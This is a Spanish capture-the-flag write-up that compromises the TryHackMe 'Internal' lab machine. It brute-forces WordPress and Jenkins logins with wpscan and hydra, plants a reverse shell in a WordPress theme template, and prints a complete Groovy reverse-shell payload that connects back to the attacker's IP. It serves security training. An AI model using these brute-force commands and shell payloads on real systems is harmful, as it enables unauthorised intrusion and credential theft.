---
title : "Internal - Write Up - Español"
date : 2021-07-09T10:52:31+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Maquina de nivel difícil en TryHackMe."
tags : ["gobuster","WPScan","nc","jenkins","docker","hydra","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/internal)  | Difícil  |  [TheMayor](https://tryhackme.com/p/TheMayor)  |

## Reconocimiento

No empezaremos haciendo nada nuevo, simplemente un `nmap` a la máquina.

```bash
╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST
Nmap scan report for 10.10.170.6
Host is up (0.082s latency).
Not shown: 990 closed ports
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp   open     http         Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1002/tcp filtered windows-icfw
1132/tcp filtered kvm-via-ip
1935/tcp filtered rtmp
2007/tcp filtered dectalk
2048/tcp filtered dls-monitor
2366/tcp filtered qip-login
6006/tcp filtered X11:6
8800/tcp filtered sunwebadmin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.25 seconds
```
Veamos si podemos encontrar alguna carpeta o endpoint oculto con `gobuster`.

```bash
╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.170.6
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/07/09 10:53:31 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/blog (Status: 301)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2021/07/09 10:53:40 Finished
===============================================================
```
Bien, encontramos dos endpoints interesantes, `/blog` y `/wordpress`. 

Navegando hacia ellos, encontramos en el codigo fuente, lo que seria una etiqueta HTML que hace referencia al dominio virtual de la máquina.
`href="http://internal.thm/blog/index.php/feed/" />`

Asique agreguemos el nuevo dominio a `/etc/hosts`

Dado que `/blog` tiene un `wordpress` detras, corramos `WPScan` para obtener más información.

```bash
╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
[...]

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  9 10:58:59 2021
[+] Requests Done: 538
[+] Cached Requests: 9
[+] Data Sent: 142.935 KB
[+] Data Received: 538.97 KB
[+] Memory used: 219.34 MB
[+] Elapsed time: 00:00:18
```

Nos devuelve información interesante, encontró un usuario: `admin`. 

Veamos si podemos hacerle fuerza bruta al login de wordpress con ese usuario...

```bash
╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[...]

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / [REDACTADO]                                                                                                           
Trying admin / bratz1 Time: 00:02:40 <                                                       > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: [REDACTADO]

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  9 11:07:29 2021
[+] Requests Done: 4026
[+] Cached Requests: 37
[+] Data Sent: 2.036 MB
[+] Data Received: 2.31 MB
[+] Memory used: 237.906 MB
[+] Elapsed time: 00:02:51
```
¡Genial!

Ahora tenemos el acceso al panel de administrador de wordpress!

## Acceso inicial - Usuario

Logeandonos al WP-Admin, podemos obtener una shell reversa usando el template de 404.php del tema twentyseventeen.

Y luego navegamos hacía `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php` para obtener la conexión!

```bash
╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                                                  ─╯
listening on [any] 1337 ...
connect to [10.9.1.222] from (UNKNOWN) [10.10.170.6] 48948
bash: cannot set terminal process group (1075): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ whoami
www-data
```

Logramos un gran avance, ya tenemos un pie en la máquina.

Buscando por los archivos de la máquina, encontramos un archivo que contiene el usuario y la contraseña de aubreanna!

```bash
www-data@internal:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:[REDACTADO]
www-data@internal:/opt$ su aubreanna
Password: [REDACTADO]

aubreanna@internal:/opt$ cat /home/aubreanna/user.txt 
[REDACTADO]
```
Podemos loguearnos con `su` y leer la flag de usuario.

## Root

En el directorio `home` de `aubreanna` hay una nota, leamosla

```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$
```
Mmmm, hay un servicio Jenkins corriendo...

Ya que tenemos las credenciales de este usuario, hagamosle un forward a ese puerto para poder acceder desde nuestra PC.

```bash
╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
The authenticity of host 'internal.thm (10.10.170.6)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'internal.thm,10.10.170.6' (ECDSA) to the list of known hosts.
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  9 09:24:06 UTC 2021

  System load:  0.02              Processes:              117
  Usage of /:   63.9% of 8.79GB   Users logged in:        0
  Memory usage: 48%               IP address for eth0:    10.10.170.6
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$
```
Mmmmm, si ahora nos dirigimos a `127.0.0.1:8080` veremos la página de jenkins solicitando credenciales, usemos `hydra` para hacerle fuerza bruta.

```bash
╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s 8080 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 11:41:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password
[8080][http-post-form] host: 127.0.0.1   login: admin   password: [REDACTADO]
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 11:42:07

```
Si!! Conseguimos el usuario y la contraseña para poder logearnos.

En la dirección `http://127.0.0.1:8080/script` podemos ejecutar un script!

Yo utilizaré una shell reversa del repositorio [PayloadsAllTheThings](`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy`):

```java
String host="10.9.1.222"; //Aquí debería ir tu ip
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                                                  ─╯
listening on [any] 1337 ...
connect to [10.9.1.222] from (UNKNOWN) [10.10.170.6] 53972
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
whoami
jenkins
cd /opt
ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:[REDACTADO]
```

SI! Shell reversa como `jenkins`!

Buscando nuevamente a traves de los directorios, encotré la contraseña de `root`!!

```bash
╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  9 09:52:03 UTC 2021

  System load:  0.0               Processes:              111
  Usage of /:   63.9% of 8.79GB   Users logged in:        0
  Memory usage: 57%               IP address for eth0:    10.10.170.6
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# cat root.txt 
[REDACTADO]
```
¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!